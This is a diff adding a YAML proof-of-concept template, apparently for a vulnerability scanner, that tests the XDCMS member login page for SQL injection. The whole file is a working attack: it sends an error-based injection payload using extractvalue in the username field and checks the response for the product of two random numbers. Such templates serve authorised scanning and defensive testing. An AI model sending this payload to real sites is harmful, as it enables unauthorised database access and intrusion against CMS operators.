@@ -1,0 +1,20 @@
+name: poc-yaml-xdcms-sql
+manual: true
+transport: http
+set:
+    r1: randomInt(800000000, 1000000000)
+    r2: randomInt(800000000, 1000000000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /index.php?m=member&f=login_save
+            body: |
+                username=dd' or extractvalue(0x0a,concat(0x0a,{{r1}}*{{r2}}))#&password=dd&submit=+%B5%C7+%C2%BC+
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0()
+detail:
+    author: amos1
+    links:
+        - https://www.uedbox.com/post/35188/
